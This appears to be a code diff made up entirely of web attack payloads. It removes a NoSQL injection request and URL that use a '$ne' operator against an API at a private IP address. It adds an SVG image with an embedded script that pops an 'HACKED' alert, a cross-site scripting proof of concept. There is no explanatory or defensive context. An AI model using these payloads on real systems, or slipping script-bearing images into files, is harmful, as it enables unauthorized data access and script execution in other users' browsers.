@@ -1,7 +1,8 @@
-POST /api/messages HTTP/1.1
-Host: 10.81.186.177:5000
-Content-Type: application/json
-Content-Length: 28
-
-{"user": {"$ne": "demo"}}
-http://10.81.186.177:5000/messages?user=%7B%22%24ne%22%3A%22demo%22%7D
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      alert("HACKED");
+   </script>
+</svg>
